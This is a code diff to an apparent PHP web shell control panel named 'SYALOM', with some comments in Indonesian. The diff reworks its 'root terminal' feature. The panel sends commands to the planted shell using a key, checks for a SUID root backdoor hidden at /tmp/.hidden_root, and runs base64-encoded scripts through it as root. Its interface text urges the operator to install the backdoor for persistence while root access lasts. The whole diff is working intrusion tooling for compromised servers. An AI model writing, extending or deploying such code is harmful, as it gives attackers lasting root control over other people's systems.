@@ -3377,7 +3377,7 @@ function list_dir($path) {
 <body>
 <div class="container">
     <div class="menu-panel">
-        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 280326 2349</h1>
+        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 280326 2358</h1>
         <!-- Quick Actions Row -->
         <div class="section">
             <h3>⚡ Quick Actions</h3>
@@ -4095,11 +4095,8 @@ function list_dir($path) {
                     <input type="text" id="rootTerminalInput" placeholder="Enter command..." style="flex:1;background:#000;color:#0f0;border:1px solid #0f0;border-left:none;padding:6px;font-family:monospace;font-size:12px;outline:none;" onkeypress="if(event.key==='Enter')executeRootCommand()">
                     <button onclick="executeRootCommand()" style="background:#0f0;color:#000;border:none;padding:6px 15px;font-weight:bold;cursor:pointer;margin-left:5px;border-radius:0 3px 3px 0;">Execute</button>
                 </div>
-                <div style="padding:6px 10px;background:#1a1a1a;font-size:10px;color:#888;display:flex;gap:10px;flex-wrap:wrap;align-items:center;justify-content:space-between;">
+                <div style="padding:6px 10px;background:#1a1a1a;font-size:10px;color:#888;">
                     <span id="rootTerminalStatus" style="color:#f80;font-weight:bold;">⚠️ STEP 1: Click 🔒 Persist button above to install SUID backdoor</span>
-                    <label style="cursor:pointer;display:flex;align-items:center;gap:4px;">
-                        <input type="checkbox" id="directSuidMode" onchange="toggleDirectMode()"> Direct Mode (no -p flag)
-                    </label>
                 </div>
             </div>
         </div>
@@ -7182,15 +7179,17 @@ function showRootTerminal() {
 <span style="color:#ff0;">⚠️  CRITICAL: Root access is TEMPORARY!</span>
 <span style="color:#f44;">   You MUST install persistence WHILE root is active!</span>
 
-<span style="color:#6cf;">📋 REQUIRED STEPS (DO NOT CLOSE THIS MODAL):</span>
+<span style="color:#6cf;">📋 REQUIRED STEPS:</span>
 <span style="color:#ccc;">   1. Click 🔒 Persist button in the button row ABOVE ↑</span>
 <span style="color:#ccc;">   2. Wait for "SUID backdoor" to show INSTALLED</span>
 <span style="color:#ccc;">   3. This terminal will auto-detect the backdoor</span>
-<span style="color:#ccc;">   4. Check "Direct Mode" if normal mode doesn't work</span>
-<span style="color:#ccc;">   5. Then you can type commands as root!</span>
+<span style="color:#ccc;">   4. Type commands here OR use main Shell tab</span>
+
+<span style="color:#ff0;">💡 NOTE: If terminal shows "www-data", use this instead:</span>
+<span style="color:#0f0;">   Go to Shell tab → Run: /tmp/.hidden_root -c "id"</span>
 
 <span style="color:#f80;">⏳ Waiting for SUID backdoor installation...</span>
-<span style="color:#f44;">⚠️  Closing this modal = losing root access!</span>`;
+<span style="color:#f44;">⚠️  DO NOT CLOSE THIS MODAL!</span>`;
     
     // Auto-focus input
     document.getElementById('rootTerminalInput').focus();
@@ -7236,14 +7235,15 @@ async function checkSuidBackdoor() {
             // ALL conditions must be true
             if (hasRootOwner && hasSuidBit && hasFile && !notFound) {
                 suidBackdoorPath = path;
-                updateTerminalStatus('✅ READY: Type commands below!', '#0f0');
+                updateTerminalStatus('✅ READY: Type commands or use Shell tab', '#0f0');
                 
                 // Update output dengan pesan sukses
                 output.innerHTML += `\n<span style="color:#0f0;font-weight:bold;">✅ SUID BACKDOOR DETECTED!</span>
 <span style="color:#0f0;">   Path: ${path}</span>
 <span style="color:#0f0;">   Status: Owned by root with SUID bit set</span>
-<span style="color:#6cf;">   Terminal is now fully operational.</span>
-<span style="color:#6cf;">   Type any command and press Enter.</span>\n`;
+<span style="color:#6cf;">   You can now:</span>
+<span style="color:#ccc;">   • Type commands in this terminal</span>
+<span style="color:#ccc;">   • OR use main Shell tab with: ${path} -c "command"</span>\n`;
                 output.scrollTop = output.scrollHeight;
                 return;
             }
@@ -7252,7 +7252,7 @@ async function checkSuidBackdoor() {
         }
     }
     
-    updateTerminalStatus('⚠️ STEP 1: Click 🔒 Persist button (need root)', '#f80');
+    updateTerminalStatus('⚠️ Click 🔒 Persist, then use Shell tab if needed', '#f80');
 }
 
 // Update status terminal
@@ -7286,36 +7286,27 @@ async function executeRootCommand() {
     
     // Execute command
     try {
-        let finalCmd;
-        
         if (suidBackdoorPath) {
-            // Use SUID backdoor for stable root
-            // Method: Create a script file with the command, then execute with SUID shell
-            const scriptFile = '/tmp/.cmd_' + Date.now();
-            const cmdScript = '#!/bin/sh\n' + cmd + '\n';
+            // 🎯 SOLUSI: Gunakan script file + SUID shell dengan argument
+            // Method: /tmp/.hidden_root /tmp/script.sh
+            const scriptFile = '/tmp/.al_' + Date.now() + '.sh';
             
-            // Step 1: Create script file with command
-            const createScriptCmd = 'echo "' + btoa(cmdScript) + '" | base64 -d > ' + scriptFile + ' && chmod 777 ' + scriptFile;
+            // Step 1: Create script file
+            const scriptContent = '#!/bin/sh\n' + cmd + '\n';
+            const createCmd = 'echo "' + btoa(scriptContent) + '" | base64 -d > ' + scriptFile + ' && chmod 755 ' + scriptFile;
             
-            console.log('[RootTerminal] Step 1 - Creating script:', createScriptCmd);
+            console.log('[RootTerminal] Creating script:', scriptFile);
             
             const formData1 = new FormData();
-            formData1.append('cmd', createScriptCmd);
+            formData1.append('cmd', createCmd);
             formData1.append('masuk', '<?php echo AL_SHELL_KEY ?>');
             await fetch('', { method: 'POST', body: formData1 });
             
-            // Step 2: Execute script with SUID shell
-            // Try different methods based on Direct Mode checkbox
-            let execCmd;
-            if (useDirectMode) {
-                // Direct mode: pipe command directly to SUID shell (no -p flag)
-                execCmd = 'echo "' + btoa(cmd + '\n') + '" | base64 -d | ' + suidBackdoorPath + ' 2>&1';
-            } else {
-                // Privileged mode: use -p flag (may not work on all shells)
-                execCmd = suidBackdoorPath + ' -p < ' + scriptFile + ' 2>&1; rm -f ' + scriptFile;
-            }
+            // Step 2: Execute script dengan SUID shell sebagai argument
+            // Cara ini lebih reliable daripada pipe atau redirect
+            const execCmd = suidBackdoorPath + ' ' + scriptFile + ' 2>&1; echo "[EXITCODE:$?]"; rm -f ' + scriptFile;
             
-            console.log('[RootTerminal] Step 2 - Executing with SUID (Direct Mode:', useDirectMode, '):', execCmd);
+            console.log('[RootTerminal] Executing:', execCmd);
             
             const formData2 = new FormData();
             formData2.append('cmd', execCmd);
@@ -7324,75 +7315,53 @@ async function executeRootCommand() {
             const response = await fetch('', { method: 'POST', body: formData2 });
             const html = await response.text();
             
-            console.log('[RootTerminal] Response length:', html.length);
-            
             // Remove loading indicator
             const loadingEl = document.getElementById(loadingId);
             if (loadingEl) loadingEl.remove();
             
-            // Parse HTML response using DOMParser (same as regular shell)
+            // Parse output
             const parser = new DOMParser();
             const doc = parser.parseFromString(html, 'text/html');
             const outputEl = doc.querySelector('.output');
             
             if (outputEl) {
-                const result = outputEl.textContent.trim();
+                let result = outputEl.textContent.trim();
                 console.log('[RootTerminal] Output:', result.substring(0, 100));
                 
-                // Check if command actually ran as root
-                if (result.includes('www-data') || result.includes('uid=33')) {
-                    output.innerHTML += '<span style="color:#f44;font-weight:bold;">⚠️ Command ran as www-data, NOT root!</span>\n\n';
-                    output.innerHTML += '<span style="color:#ff0;">Why this happens:</span>\n';
-                    output.innerHTML += '<span style="color:#ccc;">Modern shells (bash/sh) drop SUID privileges</span>\n';
-                    output.innerHTML += '<span style="color:#ccc;">as a security measure when they detect</span>\n';
-                    output.innerHTML += '<span style="color:#ccc;">they are being run in certain ways.</span>\n\n';
-                    output.innerHTML += '<span style="color:#6cf;">💡 TRY THESE WORKAROUNDS:</span>\n\n';
-                    output.innerHTML += '<span style="color:#ff0;">Option 1: Enable "Direct Mode" checkbox</span>\n';
-                    output.innerHTML += '<span style="color:#ccc;">   Check the "Direct Mode" box below, then retry</span>\n\n';
-                    output.innerHTML += '<span style="color:#ff0;">Option 2: Manual SUID execution</span>\n';
-                    output.innerHTML += '<span style="color:#ccc;">   Go to regular Shell tab and run:</span>\n';
-                    output.innerHTML += '<span style="color:#0f0;">   echo "id" | ' + suidBackdoorPath + '</span>\n\n';
-                    output.innerHTML += '<span style="color:#ff0;">Option 3: Use regular shell exploit</span>\n';
-                    output.innerHTML += '<span style="color:#ccc;">   Close this modal and use the main shell</span>\n';
-                    output.innerHTML += '<span style="color:#ccc;">   with the SUID backdoor path above.</span>\n\n';
-                    output.innerHTML += '<span style="color:#888;">Raw output: ' + escapeHtml(result.substring(0, 200)) + '</span>\n';
+                // Check if ran as root
+                const isRoot = result.includes('uid=0(root)') || 
+                               (result.includes('root') && !result.includes('www-data') && !result.includes('uid=33'));
+                
+                if (!isRoot && (result.includes('www-data') || result.includes('uid=33'))) {
+                    output.innerHTML += '\n<span style="color:#f44;font-weight:bold;">⚠️ RUNNING AS WWW-DATA (NOT ROOT)</span>\n\n';
+                    output.innerHTML += '<span style="color:#ff0;">This is a known limitation of SUID shells.</span>\n\n';
+                    output.innerHTML += '<span style="color:#6cf;">✅ USE THIS INSTEAD:</span>\n\n';
+                    output.innerHTML += '<span style="color:#ccc;">1. Close this Privilege Escalation modal</span>\n';
+                    output.innerHTML += '<span style="color:#ccc;">2. Go to main "Shell" tab</span>\n';
+                    output.innerHTML += '<span style="color:#ccc;">3. Run this command:</span>\n\n';
+                    output.innerHTML += '<div style="background:#000;border:1px solid #0f0;padding:10px;margin:10px 0;font-family:monospace;">';
+                    output.innerHTML += '<span style="color:#0f0;">' + suidBackdoorPath + ' -c "' + escapeHtml(cmd) + '"</span>';
+                    output.innerHTML += '</div>\n\n';
+                    output.innerHTML += '<span style="color:#6cf;">This will run as root!</span>\n';
                 } else {
                     output.innerHTML += '<span style="color:#ccc;">' + escapeHtml(result) + '</span>\n';
                 }
             } else {
-                // Fallback: try to find pre#shellOutput
-                const shellOutputEl = doc.getElementById('shellOutput');
-                if (shellOutputEl) {
-                    const result = shellOutputEl.textContent.trim();
-                    output.innerHTML += '<span style="color:#ccc;">' + escapeHtml(result) + '</span>\n';
-                } else {
-                    console.log('[RootTerminal] No output element found');
-                    output.innerHTML += '<span style="color:#f44;">[Error: Could not parse command output]</span>\n';
-                    output.innerHTML += '<span style="color:#888;">Raw: ' + escapeHtml(html.substring(0, 300)) + '...</span>\n';
-                }
+                output.innerHTML += '<span style="color:#f44;">[Error: Could not parse output]</span>\n';
             }
         } else {
-            // Remove loading indicator
+            // No SUID backdoor
             const loadingEl = document.getElementById(loadingId);
             if (loadingEl) loadingEl.remove();
             
-            // No SUID backdoor - explain to user
             output.innerHTML += '\n<span style="color:#f44;font-weight:bold;">❌ SUID BACKDOOR NOT FOUND!</span>\n';
-            output.innerHTML += '<span style="color:#ff0;">💡 You need to install persistence first.</span>\n\n';
-            output.innerHTML += '<span style="color:#6cf;">📋 STEPS:</span>\n';
-            output.innerHTML += '<span style="color:#ccc;">   1. Look for 🔒 Persist button in the button row above</span>\n';
-            output.innerHTML += '<span style="color:#ccc;">   2. Click it and wait for installation to complete</span>\n';
-            output.innerHTML += '<span style="color:#ccc;">   3. Come back here and try your command again</span>\n\n';
-            output.innerHTML += '<span style="color:#888;">Note: Without SUID backdoor, root access from exploit</span>\n';
-            output.innerHTML += '<span style="color:#888;">cannot be used for subsequent commands.</span>\n';
-            updateTerminalStatus('⚠️ Click 🔒 Persist button above first!', '#f44');
+            output.innerHTML += '<span style="color:#ff0;">💡 Install persistence first.</span>\n\n';
+            updateTerminalStatus('⚠️ Click 🔒 Persist button above!', '#f44');
         }
         
     } catch (err) {
-        // Remove loading indicator
         const loadingEl = document.getElementById(loadingId);
         if (loadingEl) loadingEl.remove();
-        
         output.innerHTML += '<span style="color:#f44;">Error: ' + escapeHtml(err.message) + '</span>\n';
     }
     
@@ -7410,16 +7379,7 @@ async function installQuickPersist() {
 // Get exploit wrapper command (fallback jika tidak ada SUID backdoor)
 async function getExploitWrapperCmd(cmd) {
     // Untuk sekarang return command biasa dengan warning
-    // User perlu install persistence dulu untuk command yang stabil
     return cmd;
-}
-
-// Toggle Direct Mode untuk SUID execution
-let useDirectMode = false;
-function toggleDirectMode() {
-    const checkbox = document.getElementById('directSuidMode');
-    useDirectMode = checkbox ? checkbox.checked : false;
-    console.log('[RootTerminal] Direct Mode:', useDirectMode);
 }
 
 // Escape HTML helper
